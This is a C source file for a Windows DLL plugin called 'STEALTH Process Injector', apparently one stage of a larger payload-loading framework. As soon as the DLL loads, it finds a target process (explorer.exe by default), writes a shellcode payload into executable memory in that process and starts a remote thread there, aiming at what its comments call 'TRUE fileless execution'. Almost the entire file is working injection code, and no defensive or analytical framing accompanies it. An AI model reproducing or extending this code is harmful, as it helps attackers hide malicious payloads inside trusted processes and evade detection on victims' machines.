// STEALTH Process Injector Plugin - Remote Thread Injection
// Stage: PREINJECT
// Purpose: Inject payload into another process for TRUE fileless execution
//
// Uses GetProcAddress to avoid MinGW tlhelp32.h issues

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

// Manually define what we need from tlhelp32.h
#define TH32CS_SNAPPROCESS 0x00000002

// PROCESSENTRY32 must match Windows layout exactly (556 bytes on x64)
typedef struct tagPROCESSENTRY32 {
  DWORD dwSize;
  DWORD cntUsage;
  DWORD th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD th32ModuleID;
  DWORD cntThreads;
  DWORD th32ParentProcessID;
  LONG pcPriClassBase;
  DWORD dwFlags;
  CHAR szExeFile[260]; // MAX_PATH
} PROCESSENTRY32, *LPPROCESSENTRY32;

// Function pointers for toolhelp
typedef HANDLE(WINAPI *fnCreateToolhelp32Snapshot)(DWORD, DWORD);
typedef BOOL(WINAPI *fnProcess32First)(HANDLE, LPPROCESSENTRY32);
typedef BOOL(WINAPI *fnProcess32Next)(HANDLE, LPPROCESSENTRY32);

// Stub function pointers
typedef struct {
  void *data;
  size_t size;
  BOOL is_pe;
  BOOL in_memory_mode;
} StealthPayload;

typedef StealthPayload *(*pfnGetPayload)(void);
typedef void (*pfnSetInjectionHandled)(void);

static pfnGetPayload g_GetPayload = NULL;
static pfnSetInjectionHandled g_SetInjectionHandled = NULL;

static int g_debug = 0;
static char g_target_process[MAX_PATH] = "explorer.exe";

static void init_config() {
  char *debug = getenv("STEALTH_INJECTOR_DEBUG");
  g_debug = (debug && debug[0]);

  char *target = getenv("STEALTH_INJECT_TARGET");
  if (target && target[0]) {
    strncpy(g_target_process, target, MAX_PATH - 1);
  }
}

static void log_msg(const char *msg) {
  if (!g_debug)
    return;

  char path[MAX_PATH];
  GetTempPathA(sizeof(path), path);
  strcat(path, "stealth_injector.log");

  FILE *f = fopen(path, "a");
  if (f) {
    SYSTEMTIME st;
    GetLocalTime(&st);
    fprintf(f, "[%02d:%02d:%02d] [INJECT] %s\n", st.wHour, st.wMinute,
            st.wSecond, msg);
    fclose(f);
  }
}

static BOOL ResolveStubExports(void) {
  HMODULE hStub = GetModuleHandleA(NULL);
  if (!hStub) {
    log_msg("ERROR: GetModuleHandleA failed");
    return FALSE;
  }

  g_GetPayload = (pfnGetPayload)GetProcAddress(hStub, "stealth_get_payload");
  g_SetInjectionHandled = (pfnSetInjectionHandled)GetProcAddress(
      hStub, "stealth_set_injection_handled");

  if (!g_GetPayload) {
    log_msg("ERROR: stealth_get_payload not found");
    return FALSE;
  }

  log_msg("Stub exports resolved");
  return TRUE;
}

// Find target process by name using dynamic loading
static DWORD FindProcessByName(const char *processName) {
  char buf[256];

  HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
  if (!hKernel32) {
    log_msg("ERROR: kernel32 not found");
    return 0;
  }

  fnCreateToolhelp32Snapshot pCreateToolhelp32Snapshot =
      (fnCreateToolhelp32Snapshot)GetProcAddress(hKernel32,
                                                 "CreateToolhelp32Snapshot");
  fnProcess32First pProcess32First =
      (fnProcess32First)GetProcAddress(hKernel32, "Process32First");
  fnProcess32Next pProcess32Next =
      (fnProcess32Next)GetProcAddress(hKernel32, "Process32Next");

  if (!pCreateToolhelp32Snapshot || !pProcess32First || !pProcess32Next) {
    log_msg("ERROR: Failed to resolve toolhelp functions");
    return 0;
  }

  HANDLE hSnapshot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnapshot == INVALID_HANDLE_VALUE) {
    log_msg("ERROR: CreateToolhelp32Snapshot failed");
    return 0;
  }

  PROCESSENTRY32 pe32;
  pe32.dwSize = sizeof(PROCESSENTRY32);

  sprintf(buf, "PROCESSENTRY32 size=%u", (unsigned)pe32.dwSize);
  log_msg(buf);

  if (!pProcess32First(hSnapshot, &pe32)) {
    log_msg("ERROR: Process32First failed");
    CloseHandle(hSnapshot);
    return 0;
  }

  DWORD pid = 0;
  int count = 0;
  do {
    count++;
    // Log first few processes to debug
    if (count <= 5) {
      sprintf(buf, "Process %d: '%s' PID=%lu", count, pe32.szExeFile,
              (unsigned long)pe32.th32ProcessID);
      log_msg(buf);
    }
    if (_stricmp(pe32.szExeFile, processName) == 0) {
      pid = pe32.th32ProcessID;
      sprintf(buf, "FOUND '%s' at PID %lu", processName, (unsigned long)pid);
      log_msg(buf);
      break;
    }
  } while (pProcess32Next(hSnapshot, &pe32));

  sprintf(buf, "Enumerated %d processes, found=%s", count, pid ? "YES" : "NO");
  log_msg(buf);

  CloseHandle(hSnapshot);
  return pid;
}

// Perform remote process injection
static BOOL InjectIntoProcess(DWORD targetPid, void *payload,
                              size_t payloadSize, BOOL isPE) {
  char buf[512];
  sprintf(buf, "Injecting into PID %lu, payload %zu bytes",
          (unsigned long)targetPid, payloadSize);
  log_msg(buf);

  // Open target process
  HANDLE hProcess =
      OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
                      PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
                  FALSE, targetPid);

  if (!hProcess) {
    sprintf(buf, "ERROR: OpenProcess failed: %lu", GetLastError());
    log_msg(buf);
    return FALSE;
  }

  log_msg("Opened target process");

  // Allocate memory in target process
  LPVOID remoteMem =
      VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE,
                     PAGE_EXECUTE_READWRITE);

  if (!remoteMem) {
    sprintf(buf, "ERROR: VirtualAllocEx failed: %lu", GetLastError());
    log_msg(buf);
    CloseHandle(hProcess);
    return FALSE;
  }

  sprintf(buf, "Allocated at %p in target", remoteMem);
  log_msg(buf);

  // Write payload
  SIZE_T written = 0;
  if (!WriteProcessMemory(hProcess, remoteMem, payload, payloadSize,
                          &written)) {
    sprintf(buf, "ERROR: WriteProcessMemory failed: %lu", GetLastError());
    log_msg(buf);
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return FALSE;
  }

  log_msg("Payload written to target");

  // For PE payload, we need to handle it differently
  // CreateRemoteThread only works for shellcode or DLLs
  // For now, we'll try direct execution (works for position-independent code)

  HANDLE hThread = CreateRemoteThread(
      hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL);

  if (!hThread) {
    sprintf(buf, "ERROR: CreateRemoteThread failed: %lu", GetLastError());
    log_msg(buf);
    CloseHandle(hProcess);
    return FALSE;
  }

  log_msg("Remote thread created");

  // Wait briefly
  WaitForSingleObject(hThread, 2000);

  CloseHandle(hThread);
  CloseHandle(hProcess);

  log_msg("SUCCESS: Payload injected into remote process");
  return TRUE;
}

// Main injection function
static BOOL PerformInjection(void) {
  char buf[256];

  log_msg("=== Process Injector Starting ===");
  sprintf(buf, "Target: %s", g_target_process);
  log_msg(buf);

  if (!ResolveStubExports()) {
    return FALSE;
  }

  StealthPayload *payload = g_GetPayload();
  if (!payload) {
    log_msg("ERROR: No payload available");
    return FALSE;
  }

  sprintf(buf, "Payload: %zu bytes, is_pe=%d", payload->size, payload->is_pe);
  log_msg(buf);

  // SAFETY: Remote process injection only works for shellcode, not PEs
  // PEs need proper loading (relocations, imports) which requires a reflective
  // loader For now, skip PEs and let template.dll handle them in-process
  if (payload->is_pe) {
    log_msg("PE payload - skipping remote injection (needs reflective loader)");
    log_msg("Falling back to template.dll in-process execution");
    return FALSE; // Don't signal handled - let template do it
  }

  DWORD targetPid = FindProcessByName(g_target_process);
  if (targetPid == 0) {
    sprintf(buf, "Target '%s' not found", g_target_process);
    log_msg(buf);
    return FALSE;
  }

  sprintf(buf, "Target PID: %lu", (unsigned long)targetPid);
  log_msg(buf);

  if (InjectIntoProcess(targetPid, payload->data, payload->size,
                        payload->is_pe)) {
    if (g_SetInjectionHandled) {
      g_SetInjectionHandled();
      log_msg("Signaled injection handled");
    }
    return TRUE;
  }

  return FALSE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hinstDLL);
    init_config();
    log_msg("Process Injector loaded");
    PerformInjection();
  }
  return TRUE;
}
